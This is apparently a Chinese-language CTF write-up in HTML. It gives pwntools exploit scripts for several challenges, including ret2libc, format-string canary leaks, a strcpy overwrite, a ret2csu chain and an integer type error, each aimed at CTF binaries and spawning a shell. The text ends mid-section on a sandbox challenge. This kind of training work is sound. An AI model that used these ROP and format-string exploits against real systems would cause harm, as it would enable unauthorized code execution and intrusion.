        <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>考查的是python脚本的编写，计算2025道计算题就给flag。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;info&quot;</span><br><span class="line">context.timeout = 5</span><br><span class="line"></span><br><span class="line">io = remote(&quot;challenge.imxbt.cn&quot;, 30734)</span><br><span class="line"></span><br><span class="line">digits = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line"></span><br><span class="line">def int_to_base(n, base):</span><br><span class="line">    if n == 0:</span><br><span class="line">        return &quot;0&quot;</span><br><span class="line">    sign = &quot;&quot;</span><br><span class="line">    if n &lt; 0:</span><br><span class="line">        sign = &quot;-&quot;</span><br><span class="line">        n = -n</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    while n:</span><br><span class="line">        res = digits[n % base] + res</span><br><span class="line">        n //= base</span><br><span class="line">    return sign + res</span><br><span class="line"></span><br><span class="line">def solve(expr, base):</span><br><span class="line">    if &#x27;+&#x27; in expr:</span><br><span class="line">        a, b = expr.split(&#x27;+&#x27;)</span><br><span class="line">        return int(a, base) + int(b, base)</span><br><span class="line">    if &#x27;-&#x27; in expr:</span><br><span class="line">        a, b = expr.split(&#x27;-&#x27;)</span><br><span class="line">        return int(a, base) - int(b, base)</span><br><span class="line">    if &#x27;*&#x27; in expr:</span><br><span class="line">        a, b = expr.split(&#x27;*&#x27;)</span><br><span class="line">        return int(a, base) * int(b, base)</span><br><span class="line">    if &#x27;%&#x27; in expr:</span><br><span class="line">        a, b = expr.split(&#x27;%&#x27;)</span><br><span class="line">        return int(a, base) % int(b, base)</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">while count &lt; 2025:</span><br><span class="line">    line = io.recvline().decode(errors=&quot;ignore&quot;).strip()</span><br><span class="line"></span><br><span class="line">    # 不是题目行，直接跳过</span><br><span class="line">    if not line.startswith(&#x27;[&#x27;):</span><br><span class="line">        continue</span><br><span class="line">    if &#x27;(base&#x27; not in line or &#x27;= ?&#x27; not in line:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    log.info(line)</span><br><span class="line"></span><br><span class="line">    base = int(re.search(r&#x27;base (\d+)&#x27;, line).group(1))</span><br><span class="line">    expr = re.search(r&#x27;\)\s+(.*)\s+= \?&#x27;, line).group(1)</span><br><span class="line">    expr = expr.replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    ans = solve(expr, base)</span><br><span class="line">    ans_str = int_to_base(ans, base)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(b&quot;: &quot;)</span><br><span class="line">    io.sendline(ans_str.encode())</span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>简单的ret2libc，给了gets函数，直接打就行了。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./attachment&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=31794</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=0x00000000004011e7</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr=0x4010B0</span><br><span class="line">vuln_addr=0x401196</span><br><span class="line"></span><br><span class="line">p0=cyclic(0x40+8)+p64(ret)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">sla(&quot;Please input your message: &quot;,p0)</span><br><span class="line">ru(&quot;received!&quot;)</span><br><span class="line">rl()</span><br><span class="line">addr1=rl().strip()</span><br><span class="line">puts_addr=u64(addr1.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">#puts_addr=uul64()</span><br><span class="line">leak(&quot;puts_addr&quot;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">p1=p0=cyclic(0x40+8)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(start_addr)</span><br><span class="line">sla(&quot;Please input your message: &quot;,p1)</span><br><span class="line"></span><br><span class="line">#连接</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="ezfmt"><a href="#ezfmt" class="headerlink" title="ezfmt"></a>ezfmt</h1><p>一道格式化字符串漏洞的题目，开启了canary保护</p><p><img src="/images/PCTF_ezfmt_1.png"></p><p>一开始以为打不了格式化字符串漏洞，但经过gdb调试发现可以覆盖掉前面的%s，从而泄漏canary与libc。接着就是基本的ret2libc了。</p><p><img src="/images/PCTF_ezfmt_2.png"></p><p><img src="/images/PCTF_ezfmt_3.png"></p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=31237</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">p0=cyclic(0x40)+b&quot;%19$p+%21$p&quot;</span><br><span class="line">sl(p0)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">canary=i64(16)</span><br><span class="line">ru(&quot;+0x&quot;)</span><br><span class="line">libc_base=i64(12)-0x29d90</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002a3e5</span><br><span class="line">ret=libc_base+0x0000000000029139</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">p1=cyclic(0x70-8)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(0)</span><br><span class="line">sl(p1)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="type-err"><a href="#type-err" class="headerlink" title="type_err"></a>type_err</h1><p>直接输入符合的数字即可。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30284</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">sl(b&#x27;2147483648&#x27;)</span><br><span class="line">sl(b&#x27;2147483648&#x27;)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="str-err"><a href="#str-err" class="headerlink" title="str_err"></a>str_err</h1><p>简单的strcpy绕过题目</p><p><img src="/images/PCTF_str_err.png"></p><p>但是由于password会覆盖掉username，从而会导致user_copy会覆盖掉correct_password，因此得计算好输入何时输入password即可。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=32213</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">shell=0x40125B</span><br><span class="line">sa(&quot;Please input your username: &quot;,b&quot;haooahoo&quot;)</span><br><span class="line">p0=b&quot;Secret\0&quot;+b&quot;a&quot;*41+b&quot;Secret\0&quot;+b&quot;a&quot;*49+p64(0x40101a)+p64(shell)</span><br><span class="line">s(p0)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="ret2bzdr"><a href="#ret2bzdr" class="headerlink" title="ret2bzdr"></a>ret2bzdr</h1><p>直接fmt泄漏canary，再跳到危险函数，由于没有限制sh字符串，因此可以通过system(“sh”)获取shell。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./ret2bzdr&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30253</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">sl(b&quot;%23$p&quot;)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">magic=0x04013AD</span><br><span class="line">canary=i64(16)</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line"></span><br><span class="line">p0=cyclic(0x90-0x8)+p64(canary)+p64(0)+p64(0x40101a)+p64(magic)</span><br><span class="line">sl(p0)</span><br><span class="line">sla(&quot;OH,NO!!!HACKER!!!DON&#x27;T COME!!!&quot;,b&quot;sh&quot;)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="csu"><a href="#csu" class="headerlink" title="csu?"></a>csu?</h1><p>就是打csu的板子，没什么难度。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30928</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">pop_rdi_ret=0x000000000040127b</span><br><span class="line">pop_rsi_r15_ret=0x0000000000401279</span><br><span class="line">write_plt=elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">fakerbp=0xdeadbeef</span><br><span class="line">csu_end_addr=0x040126E</span><br><span class="line">csu_front_addr=0x0401258</span><br><span class="line">main=0x4011AB</span><br><span class="line"></span><br><span class="line">p0=cyclic(0x28)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(8)+p64(write_plt)+p64(main)</span><br><span class="line">sla(&quot;input something:&quot;,p0)</span><br><span class="line">write_addr=u64(io.recv(8))</span><br><span class="line">leak(&quot;write_addr&quot;,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[&#x27;write&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">p1=cyclic(0x28)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(0)</span><br><span class="line">sl(p1)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="sandbox-err"><a href="#sandbox-err" class="headerlink" title="sandbox_err"></a>sandbox_err</h1><p>开启了沙盒保护，一开始以为又只能打orw了</p><p><img src="/images/PCTF_sandbox_err_1.png"></p><p><img src="/images/PCTF_sandbox_err_4.png"></p><p>发现了有ctx这个变量控制是否开启沙盒保护，如果我们将其改为0，就可以关闭沙盒保护从而就可以通过获取shell的方法获得flag</p><p><img src="/images/PCTF_sandbox_err_2.png"></p><p><img src="/images/PCTF_sandbox_err_3.png"></p><p>进一步发现了shell函数与fmt，那么就可以利用fmt修改ctx为0，再到shell函数获取shell从而获得flag，当然开启了pie保护，先获取基址再打。exp如下：</p><figure class="highlight plaintext"><table><tr><td 